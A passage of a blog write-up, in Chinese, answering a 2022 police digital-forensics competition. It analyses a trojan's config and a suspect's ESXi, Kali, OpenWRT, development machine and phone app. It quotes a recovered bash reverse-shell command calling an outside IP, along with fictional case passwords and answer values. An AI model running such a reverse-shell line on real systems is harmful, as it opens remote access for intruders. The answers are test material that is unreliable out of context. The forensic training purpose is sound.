+<p><img src="https://pic.imgdb.cn/item/65f795099f345e8d038e4f13.png"></p>
+<p>32、请分析木马行为，列出自动释放的文件名？（200分）(格式：a.word,b.txt,c.xls，按照a小于b进行填写)</p>
+<p><img src="https://pic.imgdb.cn/item/65f797cf9f345e8d039606e9.png"></p>
+<p>33、请分析木马行为，列出远程注入的模块文件名为？（200分）(格式：1.word)</p>
+<p><img src="https://pic.imgdb.cn/item/65f798379f345e8d03973b22.png"></p>
+<p><img src="https://pic.imgdb.cn/item/65f798879f345e8d0398182b.png"></p>
+<p>34、请分析木马行为，列出被远程注入的进程数量为？（200分）</p>
+<p><img src="https://pic.imgdb.cn/item/65f798ee9f345e8d039940d0.png"></p>
+<p>35、请分析木马配置文件“http_request.json”，找出用户ID为？（100分）</p>
+<p><img src="https://pic.imgdb.cn/item/65f799cf9f345e8d039b9441.png"></p>
+<p>36、请分析木马配置文件”http_request.json”，尝试解密“key”字段<br>的明文数据为？（150分）</p>
+<p>base64</p>
+<p><img src="https://pic.imgdb.cn/item/65f799f49f345e8d039bfa24.png"></p>
+<p>37、请分析木马配置文件”http_request.json”，尝试解密“tag_data”<br>字段的明文数据为？（200分）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">honglian........</span><br></pre></td></tr></table></figure>
+
+<p>AES解密</p>
+<p><img src="https://pic.imgdb.cn/item/65f79ab39f345e8d039e121d.png"></p>
+<p>38、请分析木马程序，该木马存在POST上传行为，请找出URL资源请求<br>路径为(相对路径)？（250分）(参考格式：<a target="_blank" rel="noopener" href="http://127.0.0.1/1.txt">http://127.0.0.1/1.txt</a>)</p>
+<p><img src="https://pic.imgdb.cn/item/65f79b469f345e8d039fb68a.png"></p>
+<p><img src="https://pic.imgdb.cn/item/65f79b809f345e8d03a05c6c.png"></p>
+<p>39、请分析木马程序，该木马存在备用跳板服务器，请找出该服务器的IP地址为？（200分）</p>
+<p><img src="https://pic.imgdb.cn/item/65f79bd99f345e8d03a160e1.png"></p>
+<h2 id="检材三-检材四"><a href="#检材三-检材四" class="headerlink" title="检材三&#x2F;检材四"></a>检材三&#x2F;检材四</h2><p>在掌握攻击者的远程回连地址后，你们通过回连地址成功抓获了三名犯罪嫌疑人。<br>经过初步审讯，你们得知三名犯罪嫌疑人分别是王某、李某和丁某。在整个犯罪链条中，王某提供联系方式和密钥，由丁某编写病毒程序，再由李某寻找目标进行渗透并植入病毒，到手后按比例分成。</p>
+<p>案件线索：</p>
+<p>根据犯罪嫌疑人王某的供述，警方获得服务器台账如下:</p>
+<table>
+<thead>
+<tr>
+<th>台账</th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>服务器备注</td>
+<td>IP地址</td>
+<td>用户名</td>
+<td>密码</td>
+<td></td>
+</tr>
+<tr>
+<td>服务器</td>
+<td>虚拟化平台</td>
+<td>222.2.2.250</td>
+<td>root</td>
+<td>!Honglian7001</td>
+</tr>
+<tr>
+<td>服务器</td>
+<td>虚拟化平台网络存储</td>
+<td>222.2.2.200</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>虚拟机</td>
+<td>openwrt&amp;wireguard</td>
+<td>192.168.200.1</td>
+<td>root</td>
+<td></td>
+</tr>
+<tr>
+<td>Github&amp;密钥服务器</td>
+<td>192.168.200.201</td>
+<td>root</td>
+<td>honglian7001</td>
+<td></td>
+</tr>
+<tr>
+<td>渗透测试机</td>
+<td>192.168.200.10</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>病毒研发机</td>
+<td>192.168.200.20</td>
+<td>root</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>现对嫌疑人的服务器进行了取证，并分别制作了镜像，请对检材三（ESXI.E01）和检材四（ESXI_NFS.E01）进行分析，并回答以下问题。<br>（1）注意：对ESXi进行仿真时，请打开Vmware WorkStation中该虚拟机的Intel VT-x&#x2F;EPT或AMD-V&#x2F;RVI以打开嵌套虚拟化。<br>（2）注意：仿真时为保证网络可以访问，请直接修改Vmware Workstation中的NAT网段，而不要尝试修改虚拟机中的IP，以增加仿真成功概率</p>
+<p><img src="https://pic.imgdb.cn/item/65f79d2c9f345e8d03a52744.png"></p>
+<p>常规配置虚拟网卡</p>
+<p><img src="https://pic.imgdb.cn/item/65f79ee39f345e8d03ab50d0.png"></p>
+<p>40、该虚拟化平台的后台登陆URL地址为？（100分）<br>（参考格式：<a target="_blank" rel="noopener" href="https://xxx.x.x.x/ui/#/login%EF%BC%89">https://xxx.x.x.x/ui/#/login）</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://222.2.2.250/ui/#/login</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/65f79f059f345e8d03abd020.png"></p>
+<p>41、该虚拟化平台的内部版本号为？（100分）</p>
+<p>根据配置手册进入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：root</span><br><span class="line">密码: !Honglian7001</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/65f79fa79f345e8d03ade5b4.png"></p>
+<p>42、该虚拟化平台网络存储服务器通过NFS进行文件共享，该NFS的配置文件的位置为？（150分）（参考格式：&#x2F;mnt&#x2F;data）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NFS的常用目录</span><br><span class="line"></span><br><span class="line">/etc/exports                                NFS服务的主要配置文件</span><br><span class="line">/usr/sbin/exportfs                       	NFS服务的管理命令</span><br><span class="line">/usr/sbin/showmount                  		客户端的查看命令</span><br><span class="line">/var/lib/nfs/etab                           记录NFS分享出来的目录的完整权限设定值</span><br><span class="line">/var/lib/nfs/xtab                           记录曾经登录过的客户端信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/65f7a12e9f345e8d03b304a4.png"></p>
+<p>43、该虚拟化平台网络存储服务器在虚拟化平台中的位置为？（200分）（参考格式：&#x2F;vxx&#x2F;vxxx&#x2F;uxxx）</p>
+<p><img src="https://pic.imgdb.cn/item/65f7a1739f345e8d03b3e34e.png"></p>
+<p>44、据嫌疑人王某供述，渗透测试机的密码存在于该虚拟机的备注中，该渗透测试机的账号、密码为？（100分）（参考格式：user&#x2F;pass）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali/kali</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/65f7a19c9f345e8d03b45c2e.png"></p>
+<p>45、攻击者是使用什么软件获取到被入侵网站的Webshell的，请计算该软件的SHA256哈希值？（250分）（格式：大写）</p>
+<p><img src="https://pic.imgdb.cn/item/65f7a31d9f345e8d03b92e52.png"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_48039118/article/details/129566299">https://blog.csdn.net/qq_48039118/article/details/129566299</a></p>
+<p><img src="https://pic.imgdb.cn/item/65f7a47b9f345e8d03bd9c77.png"></p>
+<p>46、攻击者是利用什么软件对被入侵网站进行文件浏览、命令执行等操作的，请计算该软件的主程序（可执行文件）的SHA256哈希值？（250分）（格式：大写）</p>
+<p>蚁剑</p>
+<p><img src="https://pic.imgdb.cn/item/65f7a5749f345e8d03c0b9ad.png"></p>
+<p>47、该渗透测试机的网关IP是多少？（150分）</p>
+<p><img src="https://pic.imgdb.cn/item/65f7a65b9f345e8d03c39eff.png"></p>
+<p>48、接上题，该渗透测试机曾接收过反弹shell，请分析该渗透测试机是通过何种方式接收到来自互联网的反弹shell的？（200分）（说明：提交前需联系考官核实）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">端口转发</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &quot;/www/wwwroot/www.tpshop.com&quot;;bash -i&gt;&amp; /dev/tcp/222.2.2.2/10000 0&gt;&amp;1;echo 1afceae50d5a;pwd;echo 989643de</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/65f7aa869f345e8d03d121f4.png"></p>
+<p>49、哪一条命令是攻击者用于连接财务服务器？（200分）</p>
+<p>kali启动这里出现问题</p>
+<blockquote>
+<p>问题：windows下使用VMware或者自己安装的ubuntu系统出现，不能正常进入系统，而是进入一个以initramfs开头的命令行界面</p>
+<p>原因：不正常的关闭系统，导致系统文件损坏，&#x2F;dev&#x2F;sda1或其他的系统目录文件丢失或错误</p>
+<p>解决办法：</p>
+<p>​    在initramfs&gt;的终端界面输入如下命令修复文件系统：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fsck /dev/sda1   # 当然这里也可以自己根据文件的损坏路径来设置，具体在initramfs的错误信息会显示</span><br></pre></td></tr></table></figure>
+
+<p>敲击回车一直按y即可</p>
+<p>大概4次的样子，出现********<strong><strong><strong><strong>FILE SYSTEM WAS MODIFIED</strong></strong></strong></strong>，文件系统修复成功了，</p>
+<p>然后输入 exit 退出当前的initramfs&gt;命令行界面，正常进入系统。</p>
+</blockquote>
+<p>进入后先搞个root用户</p>
+<p><img src="https://pic.imgdb.cn/item/65f7fffc9f345e8d032f3bbf.png"></p>
+<p>查看历史命令，rdesktop连接</p>
+<p><img src="https://pic.imgdb.cn/item/65f800919f345e8d0331d655.png"></p>
+<p>在里面看到前面流量中的爆破代码和ssh命令</p>
+<p><img src="https://pic.imgdb.cn/item/65f800fb9f345e8d0333d51b.png"></p>
+<p>还有一个密码文件</p>
+<p><img src="https://pic.imgdb.cn/item/65f804f79f345e8d0345199a.png"></p>
+<p>50、该openwrt&amp;wireguard服务器的外网IP的后台管理地址为？（100分）<br>（格式：<a target="_blank" rel="noopener" href="http://10.10.1.1/test/%EF%BC%89">http://10.10.1.1/test/）</a></p>
+<p><img src="https://pic.imgdb.cn/item/65f7a94e9f345e8d03cd5f00.png"></p>
+<p>51、该openwrt&amp;wireguard服务器的内核版本为？（100分）(格式：3.1.1)</p>
+<p><img src="https://pic.imgdb.cn/item/65f7a97b9f345e8d03cde79d.png"></p>
+<p>52、该openwrt&amp;wireguard的之前配置过，现已禁用的DDNS域名地址为？（100分）</p>
+<p><img src="https://pic.imgdb.cn/item/65f7a9c89f345e8d03cee052.png"></p>
+<p>53、攻击者和勒索病毒开发者是通过什么协议连入内网的，填协议名称？（200分）</p>
+<p><img src="https://pic.imgdb.cn/item/65f806c69f345e8d034c5418.png"></p>
+<p>54、接上题，该服务开启在哪个端口号？（100分）（格式：8888）</p>
+<p><img src="https://pic.imgdb.cn/item/65f8071a9f345e8d034d9a5d.png"></p>
+<p>55、据嫌疑人丁某供述，他为了开发勒索病毒曾连入该内网，请问他连接该内网所使用的公钥为？（150分）</p>
+<p><img src="https://pic.imgdb.cn/item/65f807e29f345e8d0350b14d.png"></p>
+<p>56、请分析，病毒研发机中的Chrome浏览器未删除的历史记录条数为？（150分）</p>
+<p>火眼嵌套分析</p>
+<p><img src="https://pic.imgdb.cn/item/65f808f69f345e8d03552293.png"></p>
+<p><img src="https://pic.imgdb.cn/item/65f80ae99f345e8d035caa96.png"></p>
+<p>57、病毒开发者用于向gitlab提交代码的项目地址为？（150分）</p>
+<p><img src="https://pic.imgdb.cn/item/65f80c659f345e8d0362a6f9.png"></p>
+<p>58、接上题，病毒开发者访问gitlab的账号密码为？（150分）（格式：user&#x2F;pass）</p>
+<p><img src="https://pic.imgdb.cn/item/65f80c8f9f345e8d036356a0.png"></p>
+<p>59、请分析该病毒研发机，找到启动网站(档案系统)的可执行程序名为？（100分）（格式：1.exe）</p>
+<p><img src="https://pic.imgdb.cn/item/65f80d219f345e8d03658caf.png"></p>
+<p>60、接上题，该档案系统的网站后台采用哪种框架技术？（150分）(格式：英文小写)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">springboot</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/65f8497e9f345e8d03cf04ff.png"></p>
+<p><img src="https://pic.imgdb.cn/item/65f849fb9f345e8d03d24c4b.png"></p>
+<p>61、接上题，该档案系统的Mysql数据库连接用户名、密码为？（200分）（格式：user&#x2F;pass）</p>
+<p><img src="https://pic.imgdb.cn/item/65f84a879f345e8d03d60b1e.png"></p>
+<p>62、接上题，该档案系统后台对于账号的密码采用加盐加密，使用加密算法为？（250分）（参考格式大写：RSA）</p>
+<p><img src="https://pic.imgdb.cn/item/65f84cdf9f345e8d03e58df2.png"></p>
+<p>63、接上题，在档案系统中找出财务公司被盗取的文件数量为？（250分）（格式：数字）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/65f84d619f345e8d03e8bb08.png"></p>
+<p>可以尝试绕密，加密逻辑有点没看懂</p>
+<p>在源码中找到</p>
+<p><img src="https://pic.imgdb.cn/item/65f85f429f345e8d035e7aa8.png"></p>
+<p>64、接上题，请在档案系统中找到 “zhaohong” 用户所使用的APPID为多少</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zhaohong_honglian</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/65f85d659f345e8d0352b54e.png"></p>
+<p>65、据王某交代，解密密钥存在其手机的一个APP中，请尝试找出该APP，并给出其包名？（100分）</p>
+<p><img src="https://pic.imgdb.cn/item/65f8582c9f345e8d032ff55e.png"></p>
+<p>66、请分析并提取加密钱包地址，该地址在2022-05-06 12:58:49完成一次交易，交易hash值为多少？（格式：小写）（150分）</p>
+<p><img src="https://pic.imgdb.cn/item/65f85db49f345e8d0354993f.png"></p>
+<p>67.该手机涉案QQ账号为？（250）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2678440406</span><br></pre></td></tr></table></figure>
+
+<p>重要提醒:为防止作弊，68题-70题在提交答案前，参赛人员需主动举手向工作6人员展示解题过程后方可提交，否则不得分。工作人员只负责核实解题过程是否真实，不负责答案是否准确。<br>68、该涉案APK的登陆用户名为？（100分）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">honglian</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/65f85c499f345e8d034b1f2d.png"></p>
+<p>69、该APK的登陆密码加密方式为?（150分）（格式：英文小写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64</span><br></pre></td></tr></table></figure>
+
+<p>70、该APK的登陆密码明文为？（150分）</p>
+<p><img src="https://pic.imgdb.cn/item/65f85c8c9f345e8d034cf1c4.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io">yiyi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io/2024/03/18/22%E5%8F%B0%E5%B7%9E%E6%AF%94%E6%AD%A6/">https://xyaxxya.github.io/2024/03/18/22%E5%8F%B0%E5%B7%9E%E6%AF%94%E6%AD%A6/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xyaxxya.github.io" target="_blank">Yiyi</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PC/">PC</a><a class="post-meta__tags" href="/tags/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/">电子取证</a><a class="post-meta__tags" href="/tags/wp/">wp</a><a class="post-meta__tags" href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/">服务器</a><a class="post-meta__tags" href="/tags/exsi/">exsi</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/">反编译</a><a class="post-meta__tags" href="/tags/%E6%B5%81%E9%87%8F/">流量</a><a class="post-meta__tags" href="/tags/APK/">APK</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2024/02/20/hOrdmDQnvzAoTHM.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/03/19/23%E5%8F%B0%E5%B7%9E%E6%AF%94%E6%AD%A6/" title="23台州比武"><img class="cover" src="https://s2.loli.net/2024/02/20/k5JcHuo9eUaxMWK.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">23台州比武</div></div></a></div><div class="next-post pull-right"><a href="/2024/03/11/%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%B1%80%E7%BD%91%E5%AE%89%E5%A4%A7%E6%AF%94%E6%AD%A6/" title="上海市局网安大比武"><img class="cover" src="https://s2.loli.net/2024/02/20/Hz2nS3Dp8NdIgsJ.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">上海市局网安大比武</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/03/19/23%E5%8F%B0%E5%B7%9E%E6%AF%94%E6%AD%A6/" title="23台州比武"><img class="cover" src="https://s2.loli.net/2024/02/20/k5JcHuo9eUaxMWK.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-19</div><div class="title">23台州比武</div></div></a></div><div><a href="/2024/04/06/22%E5%AE%81%E5%A4%8F%E5%88%91%E4%BE%A6%E5%A4%A7%E6%AF%94%E6%AD%A6/" title="22宁夏刑侦大比武"><img class="cover" src="https://s2.loli.net/2024/02/19/2qGB9fpjNPvKAeC.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-06</div><div class="title">22宁夏刑侦大比武</div></div></a></div><div><a href="/2024/02/16/2024%E5%B9%B4%E9%A6%96%E5%B1%8A%E7%8D%AC%E8%B1%B8%E6%9D%AFwp/" title="2024年首届獬豸杯wp"><img class="cover" src="https://s2.loli.net/2024/02/20/yWd8e3INDVH2oP6.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-16</div><div class="title">2024年首届獬豸杯wp</div></div></a></div><div><a href="/2024/02/16/2023%E4%B8%AD%E7%A7%91%E5%AE%9E%E6%95%B0wp/" title="2023中科实数wp"><img class="cover" src="https://s2.loli.net/2024/02/20/vZP2swirp7WSNxl.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-16</div><div class="title">2023中科实数wp</div></div></a></div><div><a href="/2024/02/27/%E5%B9%B3%E8%88%AA%E6%B5%8B%E9%AA%8C/" title="平航测验"><img class="cover" src="https://s2.loli.net/2024/02/19/XSgGnKMzUilF82E.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-27</div><div class="title">平航测验</div></div></a></div><div><a href="/2024/03/04/%E6%96%9F%E8%8C%B6%E7%8E%8B%E8%80%85%E5%B8%B8%E8%A7%84%E8%B5%9B-%E6%95%B0%E6%8D%AE%E7%A0%94%E5%88%A4%E4%B8%93%E9%A1%B9/" title="斟茶王者常规赛-数据研判专项"><img class="cover" src="https://s2.loli.net/2024/02/19/jV24UWc9gbtDSml.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-04</div><div class="title">斟茶王者常规赛-数据研判专项</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yiyi</div><div class="author-info__description">春风得意马蹄疾，一日看尽长安花</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xyaxxya"><i class="fab fa-github"></i><span>关注捏</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xyaxxya" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/3170234809@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://blog.csdn.net/xydsg" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=3170234809&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:3170234809@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="https://xyaxxya.github.io/2024/02/16/%E5%85%B3%E4%BA%8E%E6%88%91" target="_blank" title="wechat"><i class="fab fa-weixin"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">慢慢来，比较快</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2022%E5%B9%B4%E5%8F%B0%E5%B7%9E%E5%85%AC%E5%AE%89%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%A4%A7%E6%AF%94%E6%AD%A6%E4%BD%9C%E4%B8%9A%E6%8C%87%E5%AF%BC%E4%B9%A6"><span class="toc-number">1.</span> <span class="toc-text">2022年台州公安电子数据取证分析大比武作业指导书</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">背景介绍:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%9D%90%E4%B8%80%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">检材一：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%9D%90%E4%BA%8C"><span class="toc-number">1.3.</span> <span class="toc-text">检材二</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%9D%90%E4%B8%89-%E6%A3%80%E6%9D%90%E5%9B%9B"><span class="toc-number">1.4.</span> <span class="toc-text">检材三&#x2F;检材四</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/04/13/DonkeyDocker-v1-0%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/" title="DonkeyDocker_v1.0渗透思路"><img src="https://s2.loli.net/2024/02/20/LR5VYU3QtFxkoMp.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DonkeyDocker_v1.0渗透思路"/></a><div class="content"><a class="title" href="/2024/04/13/DonkeyDocker-v1-0%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/" title="DonkeyDocker_v1.0渗透思路">DonkeyDocker_v1.0渗透思路</a><time datetime="2024-04-13T11:15:10.000Z" title="发表于 2024-04-13 19:15:10">2024-04-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/06/22%E5%AE%81%E5%A4%8F%E5%88%91%E4%BE%A6%E5%A4%A7%E6%AF%94%E6%AD%A6/" title="22宁夏刑侦大比武"><img src="https://s2.loli.net/2024/02/19/2qGB9fpjNPvKAeC.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="22宁夏刑侦大比武"/></a><div class="content"><a class="title" href="/2024/04/06/22%E5%AE%81%E5%A4%8F%E5%88%91%E4%BE%A6%E5%A4%A7%E6%AF%94%E6%AD%A6/" title="22宁夏刑侦大比武">22宁夏刑侦大比武</a><time datetime="2024-04-06T10:56:50.000Z" title="发表于 2024-04-06 18:56:50">2024-04-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/01/HACKMYVM-QUICK3/" title="HACKMYVM-QUICK3"><img src="https://s2.loli.net/2024/02/20/j4DPtrihv27OwBM.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HACKMYVM-QUICK3"/></a><div class="content"><a class="title" href="/2024/04/01/HACKMYVM-QUICK3/" title="HACKMYVM-QUICK3">HACKMYVM-QUICK3</a><time datetime="2024-04-01T13:04:21.000Z" title="发表于 2024-04-01 21:04:21">2024-04-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/24/22%E6%9D%AD%E5%B7%9E%E6%AF%94%E6%AD%A6-%E6%B5%81%E9%87%8F+%E9%9B%86%E7%BE%A4/" title="22杭州比武(流量+集群)"><img src="https://s2.loli.net/2024/02/17/bcaAVNDYvx5leMf.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="22杭州比武(流量+集群)"/></a><div class="content"><a class="title" href="/2024/03/24/22%E6%9D%AD%E5%B7%9E%E6%AF%94%E6%AD%A6-%E6%B5%81%E9%87%8F+%E9%9B%86%E7%BE%A4/" title="22杭州比武(流量+集群)">22杭州比武(流量+集群)</a><time datetime="2024-03-24T13:22:42.000Z" title="发表于 2024-03-24 21:22:42">2024-03-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/22/ZJWA/" title="ZJWA"><img src="https://s2.loli.net/2024/02/19/MsgcRNJkUzmDS2Q.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ZJWA"/></a><div class="content"><a class="title" href="/2024/03/22/ZJWA/" title="ZJWA">ZJWA</a><time datetime="2024-03-22T14:19:37.000Z" title="发表于 2024-03-22 22:19:37">2024-03-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By yiyi</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">欢迎常来喵~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const initValine = () => {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'pYgEIy3e8aneCT2SHN7sYl1L-gzGzoHsz',
+      appKey: 'V8vEx9nsiDEMy45ekCcPUaiN',
+      avatar: 'monsterid',
+      serverURLs: 'https://pygeiy3e.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: true
+    }, null))
+  }
+
+  const loadValine = async () => {
+    if (typeof Valine === 'function') initValine()
+    else {
+      await getScript('https://cdn.jsdelivr.net/npm/valine@1.5.1/dist/Valine.min.js')
+      initValine()
+    }
+  }
+
+  if ('Valine' === 'Valine' || !false) {
